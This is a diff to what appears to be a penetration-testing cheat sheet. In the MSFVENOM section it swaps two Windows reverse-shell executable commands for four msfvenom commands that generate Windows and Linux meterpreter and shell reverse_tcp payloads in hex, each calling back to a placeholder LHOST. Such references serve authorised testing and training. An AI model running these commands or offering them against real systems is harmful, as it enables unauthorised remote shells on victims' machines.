@@ -164,8 +164,11 @@ recon-ng
 
 ################################################################ MSFVENOM
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f hex
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f hex
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f hex
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f hex
 
 ################################################################ WIRELESS
 
